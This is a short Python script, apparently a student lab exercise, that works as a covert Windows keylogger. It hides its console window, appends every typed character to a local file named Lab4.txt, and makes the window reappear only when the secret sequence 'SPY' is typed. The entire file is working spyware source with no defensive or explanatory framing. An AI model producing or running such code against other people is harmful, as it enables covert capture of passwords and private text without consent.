import win32gui
import win32con
from pynput import keyboard

window = win32gui.GetForegroundWindow()
win32gui.ShowWindow(window, win32con.SW_HIDE)

mas=['1','1','1']

def on_press(key):
    try:
        file = open("Lab4.txt", 'a')
        file.write(key.char)
        file.close()
        mas.append(key.char)
        mas.pop(0)
        print(mas)
        if ''.join(mas)=='SPY':
            win32gui.ShowWindow(window, win32con.SW_SHOW)
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()